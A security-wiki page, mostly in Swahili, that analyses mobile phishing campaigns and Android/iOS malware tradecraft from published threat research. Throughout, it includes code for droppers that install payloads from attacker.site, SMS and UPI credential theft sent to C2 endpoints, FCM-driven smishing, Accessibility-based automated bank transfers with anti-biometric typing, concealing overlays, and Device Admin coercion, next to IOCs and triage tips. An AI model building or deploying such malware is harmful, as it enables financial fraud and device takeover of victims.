# Mobile Phishing & Malicious App Distribution (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Ukurasa huu unashughulikia mbinu zinazotumiwa na threat actors kusambaza **malicious Android APKs** na **iOS mobile-configuration profiles** kupitia phishing (SEO, social engineering, fake stores, dating apps, etc.).
> Nyenzo hizi zimebadilishwa kutoka kampeni ya SarangTrap iliyofichuliwa na Zimperium zLabs (2025) na utafiti mwingine wa umma.

## Attack Flow

1. **SEO/Phishing Infrastructure**
* Sajili domains nyingi zinazofanana kwa kuangalia (dating, cloud share, car service…).
– Tumia keywords za lugha ya eneo na emojis kwenye elementi ya `<title>` ili kupata rank kwenye Google.
– Hosta *zote mbili* Android (`.apk`) na iOS install instructions kwenye landing page ileile.
2. **First Stage Download**
* Android: link ya moja kwa moja kwenda kwenye APK isiyo **signed** au ya “third-party store”.
* iOS: `itms-services://` au link ya kawaida ya HTTPS kwenda kwenye malicious **mobileconfig** profile (tazama hapa chini).
3. **Post-install Social Engineering**
* Wakati wa run ya kwanza app huomba **invitation / verification code** (udanganyifu wa access ya kipekee).
* Code hiyo huwekwa **POST** kupitia HTTP kwenda Command-and-Control (C2).
* C2 hujibu `{"success":true}` ➜ malware inaendelea.
* Sandbox / AV dynamic analysis isiyowahi kuwasilisha code halali haioni **tabia yoyote mbaya** (evasion).
4. **Runtime Permission Abuse** (Android)
* Dangerous permissions huombwa tu **baada ya positive C2 response**:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.READ_PHONE_STATE"/>
<!-- Older builds also asked for SMS permissions -->
```
* Variants za karibuni **huondoa `<uses-permission>` ya SMS kutoka `AndroidManifest.xml`** lakini huacha code path ya Java/Kotlin inayosoma SMS kupitia reflection ⇒ hupunguza static score huku bado ikifanya kazi kwenye devices zinazoruhusu permission hiyo kupitia ubadhirifu wa `AppOps` au targets za zamani.

5. **Android 13+ Restricted Settings & Dropper Bypass (SecuriDropper‑style)**
* Android 13 ilianzisha **Restricted settings** kwa sideloaded apps: toggles za Accessibility na Notification Listener huwa zimefifishwa hadi mtumiaji aruhusu restricted settings kwa dhahiri kwenye **App info**.
* Phishing pages na droppers sasa huja na maelekezo ya UI ya hatua kwa hatua ili **kuruhusu restricted settings** kwa app iliyosideloadiwa kisha kuwezesha Accessibility/Notification access.
* Bypass mpya zaidi ni kusakinisha payload kupitia **session-based PackageInstaller flow** (njia ileile ambayo app stores hutumia). Android huihesabu app kama iliyosakinishwa kutoka store, hivyo Restricted settings haisimamishi tena Accessibility.
* Triage hint: kwenye dropper, tafuta `PackageInstaller.createSession/openSession` pamoja na code inayompeleka mara moja victim kwenye `ACTION_ACCESSIBILITY_SETTINGS` au `ACTION_NOTIFICATION_LISTENER_SETTINGS`.

6. **Facade UI & Background Collection**
* App huonyesha views zisizo na madhara (SMS viewer, gallery picker) zilizotekelezwa locally.
* Wakati huohuo hutoa nje:
- IMEI / IMSI, phone number
- Full `ContactsContract` dump (JSON array)
- JPEG/PNG kutoka `/sdcard/DCIM` iliyobanwa kwa [Luban](https://github.com/Curzibn/Luban) ili kupunguza size
- Optional SMS content (`content://sms`)
Payloads huwekwa **batch-zipped** na kutumwa kupitia `HTTP POST /upload.php`.
7. **iOS Delivery Technique**
* Single **mobile-configuration profile** inaweza kuomba `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` n.k. ili kuingiza device kwenye supervision ya “MDM”-like.
* Maelekezo ya social-engineering:
1. Fungua Settings ➜ *Profile downloaded*.
2. Bonyeza *Install* mara tatu (screenshots kwenye phishing page).
3. Trust unsigned profile ➜ attacker anapata entitlement ya *Contacts* na *Photo* bila App Store review.
8. **iOS Web Clip Payload (phishing app icon)**
* `com.apple.webClip.managed` payloads zinaweza **kufunga phishing URL kwenye Home Screen** kwa icon/label yenye brand.
* Web Clips zinaweza kuendeshwa kwa **full-screen** (huficha browser UI) na kuwekewa alama kuwa **non-removable**, ikimlazimu victim kufuta profile ili kuondoa icon.
9. **Network Layer**
* Plain HTTP, mara nyingi kwenye port 80 na HOST header kama `api.<phishingdomain>.com`.
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (hakuna TLS → ni rahisi kuiona).

## Red-Team Tips

* **Dynamic Analysis Bypass** – Wakati wa malware assessment, automate sehemu ya invitation code kwa kutumia Frida/Objection ili kufikia branch mbaya.
* **Manifest vs. Runtime Diff** – Linganisha `aapt dump permissions` na runtime `PackageManager#getRequestedPermissions()`; missing dangerous perms ni red flag.
* **Network Canary** – Sanidi `iptables -p tcp --dport 80 -j NFQUEUE` ili kugundua burst za POST zisizo imara baada ya kuingiza code.
* **mobileconfig Inspection** – Tumia `security cms -D -i profile.mobileconfig` kwenye macOS ili kuorodhesha `PayloadContent` na kuona entitlements nyingi kupita kiasi.

## Useful Frida Snippet: Auto-Bypass Invitation Code

<details>
<summary>Frida: auto-bypass invitation code</summary>
```javascript
// frida -U -f com.badapp.android -l bypass.js --no-pause
// Hook HttpURLConnection write to always return success
Java.perform(function() {
var URL = Java.use('java.net.URL');
URL.openConnection.implementation = function() {
var conn = this.openConnection();
var HttpURLConnection = Java.use('java.net.HttpURLConnection');
if (Java.cast(conn, HttpURLConnection)) {
conn.getResponseCode.implementation = function(){ return 200; };
conn.getInputStream.implementation = function(){
return Java.use('java.io.ByteArrayInputStream').$new("{\"success\":true}".getBytes());
};
}
return conn;
};
});
```
</details>

## Viashiria (Generic)
```
/req/checkCode.php        # invite code validation
/upload.php               # batched ZIP exfiltration
LubanCompress 1.1.8       # "Luban" string inside classes.dex
```
---

## Android WebView Payment Phishing (UPI) – Dropper + FCM C2 Pattern

Mfumo huu umeonekana katika kampeni zinazotumia mada za faida za serikali kuiba vitambulisho vya Indian UPI na OTPs. Waendeshaji huunganisha majukwaa yenye sifa nzuri kwa uwasilishaji na uimara.

### Delivery chain across trusted platforms
- YouTube video lure → description contains a short link
- Shortlink → GitHub Pages phishing site imitating the legit portal
- Same GitHub repo hosts an APK with a fake “Google Play” badge linking directly to the file
- Dynamic phishing pages live on Replit; remote command channel uses Firebase Cloud Messaging (FCM)

### Dropper with embedded payload and offline install
- First APK is an installer (dropper) that ships the real malware at `assets/app.apk` and prompts the user to disable Wi‑Fi/mobile data to blunt cloud detection.
- The embedded payload installs under an innocuous label (e.g., “Secure Update”). After install, both the installer and the payload are present as separate apps.

Static triage tip (grep for embedded payloads):
```bash
unzip -l sample.apk | grep -i "assets/app.apk"
# Or:
zipgrep -i "classes|.apk" sample.apk | head
```
### Ugunduzi wa endpoint wa dynamic kupitia shortlink
- Malware huchukua orodha ya plain-text, comma-separated ya live endpoints kutoka kwenye shortlink; simple string transforms hutengeneza final phishing page path.

Example (sanitised):
```
GET https://rebrand.ly/dclinkto2
Response: https://sqcepo.replit.app/gate.html,https://sqcepo.replit.app/addsm.php
Transform: "gate.html" → "gate.htm" (loaded in WebView)
UPI credential POST: https://sqcepo.replit.app/addup.php
SMS upload:           https://sqcepo.replit.app/addsm.php
```
Pseudo-code:
```java
String csv = httpGet(shortlink);
String[] parts = csv.split(",");
String upiPage = parts[0].replace("gate.html", "gate.htm");
String smsPost = parts[1];
String credsPost = upiPage.replace("gate.htm", "addup.php");
```
### Uvunaji wa vitambulisho vya UPI unaotegemea WebView
- Hatua ya “Make payment of ₹1 / UPI‑Lite” hupakia fomu ya HTML ya mshambuliaji kutoka kwa endpoint ya dynamic ndani ya WebView na kunasa sehemu nyeti (phone, bank, UPI PIN) ambazo zinatumwa kwa `POST` kwenda `addup.php`.

Minimal loader:
```java
WebView wv = findViewById(R.id.web);
wv.getSettings().setJavaScriptEnabled(true);
wv.loadUrl(upiPage); // ex: https://<replit-app>/gate.htm
```
### Kujieneza na kunasa SMS/OTP
- Ruhusa za kushambulia huombwa wakati wa kwanza kuendeshwa:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.SEND_SMS"/>
<uses-permission android:name="android.permission.READ_SMS"/>
<uses-permission android:name="android.permission.CALL_PHONE"/>
```
- Anwani huwekwa kwenye mzunguko ili kutuma kwa wingi smishing SMS kutoka kwenye kifaa cha mwathirika.
- SMS zinazoingia hunaswa na `broadcast receiver` na kupakiwa pamoja na metadata (mtumaji, maudhui, slot ya SIM, `per-device random ID`) kwenda `/addsm.php`.

Mchoro wa `Receiver`:
```java
public void onReceive(Context c, Intent i){
SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(i);
for (SmsMessage m: msgs){
postForm(urlAddSms, new FormBody.Builder()
.add("senderNum", m.getOriginatingAddress())
.add("Message", m.getMessageBody())
.add("Slot", String.valueOf(getSimSlot(i)))
.add("Device rand", getOrMakeDeviceRand(c))
.build());
}
}
```
### Firebase Cloud Messaging (FCM) kama C2 imara
- Payload inajiandikisha kwa FCM; push messages hubeba uwanja wa `_type` unaotumika kama switch kuanzisha actions (kwa mfano, kusasisha phishing text templates, toggle behaviours).

Example FCM payload:
```json
{
"to": "<device_fcm_token>",
"data": {
"_type": "update_texts",
"template": "New subsidy message..."
}
}
```
Handler sketch:
```java
@Override
public void onMessageReceived(RemoteMessage msg){
String t = msg.getData().get("_type");
switch (t){
case "update_texts": applyTemplate(msg.getData().get("template")); break;
case "smish": sendSmishToContacts(); break;
// ... more remote actions
}
}
```
### Viashiria/IOCs
- APK ina payload ya pili katika `assets/app.apk`
- WebView hupakia malipo kutoka `gate.htm` na hutuma nje kwenda `/addup.php`
- Utoaji wa SMS kwenda `/addsm.php`
- Shortlink-driven config fetch (kwa mfano, `rebrand.ly/*`) inayorudisha endpoint za CSV
- Apps zenye lebo za jumla kama “Update/Secure Update”
- FCM `data` messages zenye `_type` discriminator katika apps zisizoaminika

---

## Socket.IO/WebSocket-based APK Smuggling + Fake Google Play Pages

Washambulizi kwa kuongezeka hubadilisha static APK links na Socket.IO/WebSocket channel iliyopachikwa ndani ya Google Play–lookalikes lures. Hii huficha payload URL, hupita URL/extension filters, na huhifadhi install UX ya uhalisia.

Typical client flow iliyoonekana kwa wingi:

<details>
<summary>Socket.IO fake Play downloader (JavaScript)</summary>
```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
const url = URL.createObjectURL(blob);
const a = document.createElement("a");
a.href = url; a.download = "app.apk"; a.style.display = "none";
document.body.appendChild(a); a.click();
});
```
</details>

Kwa nini hukwepa udhibiti rahisi:
- Hakuna static APK URL inayofichuliwa; payload hujengwa upya kwenye memory kutoka WebSocket frames.
- URL/MIME/extension filters zinazozuia direct .apk responses zinaweza kukosa binary data inayopitishwa kupitia WebSockets/Socket.IO.
- Crawlers na URL sandboxes ambazo hazitekelezi WebSockets hazitapokea payload.

Angalia pia WebSocket tradecraft na tooling:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## Android Accessibility/Overlay & Device Admin Abuse, ATS automation, and NFC relay orchestration – RatOn case study

RatOn banker/RAT campaign (ThreatFabric) ni mfano halisi wa jinsi modern mobile phishing operations huchanganya WebView droppers, Accessibility-driven UI automation, overlays/ransom, Device Admin coercion, Automated Transfer System (ATS), crypto wallet takeover, na hata NFC-relay orchestration. Sehemu hii inaweka kwa muhtasari techniques zinazoweza kutumika tena.

### Stage-1: WebView → native install bridge (dropper)
Attackers huonyesha WebView inayomuelekeza kwenye attacker page na kuingiza JavaScript interface inayofichua native installer. Tap kwenye HTML button huingia kwenye native code inayosakinisha second-stage APK iliyopakiwa kwenye assets za dropper kisha hui-launch moja kwa moja.

Minimal pattern:

<details>
<summary>Stage-1 dropper minimal pattern (Java)</summary>
```java
public class DropperActivity extends Activity {
@Override protected void onCreate(Bundle b){
super.onCreate(b);
WebView wv = new WebView(this);
wv.getSettings().setJavaScriptEnabled(true);
wv.addJavascriptInterface(new Object(){
@android.webkit.JavascriptInterface
public void installApk(){
try {
PackageInstaller pi = getPackageManager().getPackageInstaller();
PackageInstaller.SessionParams p = new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);
int id = pi.createSession(p);
try (PackageInstaller.Session s = pi.openSession(id);
InputStream in = getAssets().open("payload.apk");
OutputStream out = s.openWrite("base.apk", 0, -1)){
byte[] buf = new byte[8192]; int r; while((r=in.read(buf))>0){ out.write(buf,0,r);} s.fsync(out);
}
PendingIntent status = PendingIntent.getBroadcast(this, 0, new Intent("com.evil.INSTALL_DONE"), PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
pi.commit(id, status.getIntentSender());
} catch (Exception e) { /* log */ }
}
}, "bridge");
setContentView(wv);
wv.loadUrl("https://attacker.site/install.html");
}
}
```
</details>

HTML kwenye ukurasa:
```html
<button onclick="bridge.installApk()">Install</button>
```
Baada ya kusakinisha, dropper huanzisha payload kupitia explicit package/activity:
```java
Intent i = new Intent();
i.setClassName("com.stage2.core", "com.stage2.core.MainActivity");
startActivity(i);
```
Wazo la uwindaji: apps zisizoaminika zinazopiga simu `addJavascriptInterface()` na kufichua methods za aina ya installer kwa WebView; APK inayosafirisha payload ya pili iliyopachikwa chini ya `assets/` na kuanzisha Package Installer Session API.

### Funnel ya ridhaa: Accessibility + Device Admin + follow-on runtime prompts
Stage-2 hufungua WebView inayohost ukurasa wa “Access”. Kitufe chake kinaita method iliyosafirishwa nje ambayo humpeleka mwathiriwa kwenye mipangilio ya Accessibility na kuomba kuwasha service mbovu. Mara tu inapokubaliwa, malware hutumia Accessibility kubofya kiotomatiki kupitia dialogs zinazofuata za runtime permission (contacts, overlay, manage system settings, n.k.) na huomba Device Admin.

- Accessibility husaidia kwa programmatically kukubali prompts za baadaye kwa kutafuta vitufe kama “Allow”/“OK” kwenye node-tree na kutuma clicks.
- Overlay permission check/request:
```java
if (!Settings.canDrawOverlays(ctx)) {
Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
Uri.parse("package:" + ctx.getPackageName()));
ctx.startActivity(i);
}
```
See also:

{{#ref}}
../../mobile-pentesting/android-app-pentesting/accessibility-services-abuse.md
{{#endref}}

### Phishing ya overlay/ransom kupitia WebView
Waendeshaji wanaweza kutoa amri za:
- kuonyesha overlay ya skrini nzima kutoka URL, au
- kupitisha inline HTML inayopakiwa kwenye overlay ya WebView.

Matumizi yanayowezekana: coercion (kuingiza PIN), kufungua wallet ili kunasa PIN, ujumbe wa ransom. Hifadhi amri ya kuhakikisha ruhusa ya overlay imetolewa ikiwa haipo.

### Modeli ya udhibiti wa mbali – pseudo-screen ya maandishi + screen-cast
- Low-bandwidth: mara kwa mara dump mti wa Accessibility node, serializa maandishi/roles/bounds zinazoonekana na tuma kwa C2 kama pseudo-screen (amri kama `txt_screen` mara moja na `screen_live` mfululizo).
- High-fidelity: omba MediaProjection na anza screen-casting/recording inapohitajika (amri kama `display` / `record`).

### ATS playbook (automation ya app ya benki)
Ukipewa JSON task, fungua app ya benki, endesha UI kupitia Accessibility kwa mchanganyiko wa text queries na coordinate taps, na ingiza payment PIN ya mhanga inapoulizwa.

Mfano wa task:
```json
{
"cmd": "transfer",
"receiver_address": "ACME s.r.o.",
"account": "123456789/0100",
"amount": "24500.00",
"name": "ACME"
}
```
Picha za mfano zinazoonekana katika mtiririko mmoja wa shabaha (CZ → EN):
- "Nová platba" → "New payment"
- "Zadat platbu" → "Enter payment"
- "Nový příjemce" → "New recipient"
- "Domácí číslo účtu" → "Domestic account number"
- "Další" → "Next"
- "Odeslat" → "Send"
- "Ano, pokračovat" → "Yes, continue"
- "Zaplatit" → "Pay"
- "Hotovo" → "Done"

Waendeshaji pia wanaweza kuangalia/kupandisha viwango vya uhamisho kupitia amri kama `check_limit` na `limit` ambazo husogeza UI ya limits kwa njia sawa.

### Crypto wallet seed extraction
Lengo kama MetaMask, Trust Wallet, Blockchain.com, Phantom. Mtiririko: fungua (PIN iliyoibiwa au password iliyotolewa), nenda kwenye Security/Recovery, onyesha seed phrase, keylog/exfiltrate it. Tumia locale-aware selectors (EN/RU/CZ/SK) ili kuimarisha urambazaji kati ya lugha.

### Device Admin coercion
Device Admin APIs hutumiwa kuongeza fursa za kunasa PIN na kumchanganya mwathiriwa:

- Immediate lock:
```java
dpm.lockNow();
```
- Maliza muda wa credential ya sasa ili kulazimisha mabadiliko (Accessibility hunasa PIN/password mpya):
```java
dpm.setPasswordExpirationTimeout(admin, 1L); // requires admin / often owner
```
- Lazimisha ufunguaji usio wa kibayometriki kwa kuzima vipengele vya kibayometriki vya keyguard:
```java
dpm.setKeyguardDisabledFeatures(admin,
DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT |
DevicePolicyManager.KEYGUARD_DISABLE_TRUST_AGENTS);
```
Note: Udhibiti mwingi wa `DevicePolicyManager` unahitaji `Device Owner`/`Profile Owner` kwenye Android za hivi karibuni; baadhi ya miundo ya OEM inaweza kuwa haina vikwazo vikali. Daima thibitisha kwenye OS/OEM lengwa.

### NFC relay orchestration (NFSkate)
Stage-3 inaweza kusakinisha na kuanzisha moduli ya nje ya NFC-relay (mfano, NFSkate) na hata kuipatia template ya HTML ili kumwongoza mwathiriwa wakati wa relay. Hii huwezesha cash-out ya kadi ya contactless card-present pamoja na ATS ya mtandaoni.

Background: [NFSkate NFC relay](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay).

### Operator command set (sample)
- UI/state: `txt_screen`, `screen_live`, `display`, `record`
- Social: `send_push`, `Facebook`, `WhatsApp`
- Overlays: `overlay` (inline HTML), `block` (URL), `block_off`, `access_tint`
- Wallets: `metamask`, `trust`, `blockchain`, `phantom`
- ATS: `transfer`, `check_limit`, `limit`
- Device: `lock`, `expire_password`, `disable_keyguard`, `home`, `back`, `recents`, `power`, `touch`, `swipe`, `keypad`, `tint`, `sound_mode`, `set_sound`
- Comms/Recon: `update_device`, `send_sms`, `replace_buffer`, `get_name`, `add_contact`
- NFC: `nfs`, `nfs_inject`

### Accessibility-driven ATS anti-detection: human-like text cadence and dual text injection (Herodotus)

Wahalifu wanazidi kuchanganya uendeshaji wa Accessibility-driven automation na anti-detection uliolengwa dhidi ya basic behaviour biometrics. Banker/RAT wa hivi karibuni anaonyesha njia mbili zinazokamilishana za utoaji wa maandishi na toggle ya operator ili kuiga uandishi wa binadamu kwa cadence iliyobadilishwa nasibu.

- Discovery mode: orodhesha nodes zinazoonekana kwa selectors na bounds ili kulenga inputs kwa usahihi (ID, text, contentDescription, hint, bounds) kabla ya kutenda.
- Dual text injection:
- Mode 1 – `ACTION_SET_TEXT` moja kwa moja kwenye node lengwa (thabiti, hakuna keyboard);
- Mode 2 – weka clipboard + `ACTION_PASTE` ndani ya node iliyopata focus (hufanya kazi direct setText ikizuiwa).
- Human-like cadence: gawanya string iliyotolewa na operator na uitoe herufi kwa herufi kwa delay ya nasibu ya 300–3000 ms kati ya matukio ili kukwepa heuristics za “machine-speed typing”. Hutekelezwa ama kwa kukuza thamani taratibu kupitia `ACTION_SET_TEXT`, au kwa kubandika herufi moja kwa wakati.

<details>
<summary>Java sketch: node discovery + delayed per-char input via setText or clipboard+paste</summary>
```java
// Enumerate nodes (HVNCA11Y-like): text, id, desc, hint, bounds
void discover(AccessibilityNodeInfo r, List<String> out){
if (r==null) return; Rect b=new Rect(); r.getBoundsInScreen(b);
CharSequence id=r.getViewIdResourceName(), txt=r.getText(), cd=r.getContentDescription();
out.add(String.format("cls=%s id=%s txt=%s desc=%s b=%s",
r.getClassName(), id, txt, cd, b.toShortString()));
for(int i=0;i<r.getChildCount();i++) discover(r.getChild(i), out);
}

// Mode 1: progressively set text with randomized 300–3000 ms delays
void sendTextSetText(AccessibilityNodeInfo field, String s) throws InterruptedException{
String cur = "";
for (char c: s.toCharArray()){
cur += c; Bundle b=new Bundle();
b.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, cur);
field.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, b);
Thread.sleep(300 + new java.util.Random().nextInt(2701));
}
}

// Mode 2: clipboard + paste per-char with randomized delays
void sendTextPaste(AccessibilityService svc, AccessibilityNodeInfo field, String s) throws InterruptedException{
field.performAction(AccessibilityNodeInfo.ACTION_FOCUS);
ClipboardManager cm=(ClipboardManager) svc.getSystemService(Context.CLIPBOARD_SERVICE);
for (char c: s.toCharArray()){
cm.setPrimaryClip(ClipData.newPlainText("x", Character.toString(c)));
field.performAction(AccessibilityNodeInfo.ACTION_PASTE);
Thread.sleep(300 + new java.util.Random().nextInt(2701));
}
}
```
</details>

Kuzuia overlays kwa udanganyifu hufunika:
- Render full-screen `TYPE_ACCESSIBILITY_OVERLAY` yenye opacity inayodhibitiwa na operator; iwe na opa kwa victim huku remote automation ikiendelea chini yake.
- Commands zinazoonyeshwa kwa kawaida: `opacityOverlay <0..255>`, `sendOverlayLoading <html/url>`, `removeOverlay`.

Minimal overlay yenye alpha inayoweza kurekebishwa:
```java
View v = makeOverlayView(ctx); v.setAlpha(0.92f); // 0..1
WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
MATCH_PARENT, MATCH_PARENT,
WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
PixelFormat.TRANSLUCENT);
wm.addView(v, lp);
```
Operator control primitives often seen: `BACK`, `HOME`, `RECENTS`, `CLICKTXT`/`CLICKDESC`/`CLICKELEMENT`/`CLICKHINT`, `TAP`/`SWIPE`, `NOTIFICATIONS`, `OPNPKG`, `VNC`/`VNCA11Y` (screen sharing).

## Multi-stage Android dropper with WebView bridge, JNI string decoder, and staged DEX loading

Uchambuzi wa CERT Polska wa 03 Aprili 2026 wa **cifrat** ni rejea nzuri kwa loader ya Android ya kisasa inayosambazwa kupitia phishing ambapo APK inayoonekana ni ganda la kisakinishi tu. Tradecraft inayoweza kutumika tena si jina la familia, bali ni jinsi stages zinavyofungwa mfululizo:

1. Ukurasa wa phishing unatoa APK ya lure.
2. Stage 0 huomba `REQUEST_INSTALL_PACKAGES`, hupakia native `.so`, hufungua kwa decryption blob iliyopachikwa, na kusakinisha stage 2 kwa kutumia **PackageInstaller sessions**.
3. Stage 2 hufungua kwa decryption asset nyingine iliyofichwa, huiitikia kama ZIP, na **dynamically loads DEX** kwa ajili ya final RAT.
4. Final stage hutumia vibaya Accessibility/MediaProjection na hutumia WebSockets kwa control/data.

### WebView JavaScript bridge as the installer controller

Badala ya kutumia WebView kwa branding ya bandia tu, lure inaweza kufichua bridge inayoruhusu ukurasa wa local/remote kufanya fingerprint ya device na kuchochea native install logic:
```java
webView.addJavascriptInterface(controller, "Android");
webView.loadUrl("file:///android_asset/bootstrap.html");

@JavascriptInterface
public String get_SYSINFO() { /* SDK, model, manufacturer, locale */ }

@JavascriptInterface
public void start() { mainHandler.post(this::installStage2); }
```
Mawazo ya triage:
- grep kwa `addJavascriptInterface`, `@JavascriptInterface`, `loadUrl("file:///android_asset/` na remote phishing URLs zinazotumika katika activity moja
- tazama bridges zinazofichua methods za aina ya installer (`start`, `install`, `openAccessibility`, `requestOverlay`)
- ikiwa bridge inaendeshwa na phishing page, itazame kama operator/controller surface, si UI tu

### Native string decoding iliyosajiliwa katika `JNI_OnLoad`

Mchoro mmoja muhimu ni Java method inayoonekana kuwa haina madhara lakini kwa kweli inaungwa mkono na `RegisterNatives` wakati wa `JNI_OnLoad`. Katika cifrat, decoder ilipuuza char ya kwanza, ilitumia ya pili kama 1-byte XOR key, ikahex-decode sehemu iliyobaki, na ikabadilisha kila byte kama `((b - i) & 0xff) ^ key`.

Minimal offline reproduction:
```python
def decode_native(s: str) -> str:
key = ord(s[1]); raw = bytes.fromhex(s[2:])
return bytes((((b - i) & 0xFF) ^ key) for i, b in enumerate(raw)).decode()
```
Gunakan hii unapoyaona:
- simu zinazojirudia kwa method moja ya Java inayoungwa mkono na native kwa URLs, package names, au keys
- `JNI_OnLoad` ikitafuta classes na kuita `RegisterNatives`
- hakuna plaintext strings zenye maana ndani ya DEX, lakini kuna constants nyingi fupi zenye muonekano wa hex zinazopitishwa kwenye helper moja

### Layered payload staging: XOR resource -> installed APK -> RC4-like asset -> ZIP -> DEX

Familia hii ilitumia layers mbili za unpacking ambazo zinafaa kuchunguzwa kwa njia ya generic:

- **Stage 0**: decrypt `res/raw/*.bin` kwa XOR key inayotokana kupitia native decoder, kisha install plaintext APK kupitia `PackageInstaller.createSession` -> `openWrite` -> `fsync` -> `commit`
- **Stage 2**: extract asset isiyoonekana ya kutiliwa shaka kama `FH.svg`, decrypt kwa routine inayofanana na RC4, parse matokeo kama ZIP, kisha load hidden DEX files

Hii ni dalili imara ya pipeline halisi ya dropper/loader kwa sababu kila layer huifanya stage inayofuata kuwa opaque kwa basic static scanning.

Quick triage checklist:
- `REQUEST_INSTALL_PACKAGES` pamoja na `PackageInstaller` session calls
- receivers za `PACKAGE_ADDED` / `PACKAGE_REPLACED` kuendeleza chain baada ya install
- encrypted blobs chini ya `res/raw/` au `assets/` zenye extensions zisizo za media
- `DexClassLoader` / `InMemoryDexClassLoader` / ZIP handling karibu na custom decryptors

### Native anti-debugging through `/proc/self/maps`

Native bootstrap pia ilichunguza `/proc/self/maps` kwa `libjdwp.so` na ikaacha kufanya kazi ikiwa ipo. Hii ni practical early anti-analysis check kwa sababu debugging inayotegemea JDWP huacha mapped library inayotambulika:
```c
FILE *f = fopen("/proc/self/maps", "r");
while (fgets(line, sizeof(line), f)) {
if (strstr(line, "libjdwp.so")) return -1;
}
```
Mawazo ya uwindaji:
- grep code asilia / matokeo ya decompiler kwa `/proc/self/maps`, `libjdwp.so`, `frida`, `qemu`, `goldfish`, `ranchu`
- ikiwa Frida hooks zinafika kuchelewa sana, kagua `.init_array` na `JNI_OnLoad` kwanza
- chukulia anti-debug + string decoder + staged install kama kundi moja, si matokeo huru

## References

- [New Android Malware Herodotus Mimics Human Behaviour to Evade Detection](https://www.threatfabric.com/blogs/new-android-malware-herodotus-mimics-human-behaviour-to-evade-detection)

- [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [Luban – Android image compression library](https://github.com/Curzibn/Luban)
- [Android Malware Promises Energy Subsidy to Steal Financial Data (McAfee Labs)](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/android-malware-promises-energy-subsidy-to-steal-financial-data/)
- [Firebase Cloud Messaging — Docs](https://firebase.google.com/docs/cloud-messaging)
- [The Rise of RatOn: From NFC heists to remote control and ATS (ThreatFabric)](https://www.threatfabric.com/blogs/the-rise-of-raton-from-nfc-heists-to-remote-control-and-ats)
- [GhostTap/NFSkate – NFC relay cash-out tactic (ThreatFabric)](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay)
- [Banker Trojan Targeting Indonesian and Vietnamese Android Users (DomainTools)](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
- [DomainTools SecuritySnacks – ID/VN Banker Trojans (IOCs)](https://github.com/DomainTools/SecuritySnacks/blob/main/2025/BankerTrojan-ID-VN)
- [Socket.IO](https://socket.io)
- [Bypassing Android 13 Restrictions with SecuriDropper (ThreatFabric)](https://www.threatfabric.com/blogs/droppers-bypassing-android-13-restrictions)
- [Analysis of cifrat: could this be an evolution of a mobile RAT?](https://cert.pl/en/posts/2026/04/cifrat-analysis/)
- [Web Clips payload settings for Apple devices](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)

{{#include ../../banners/hacktricks-training.md}}
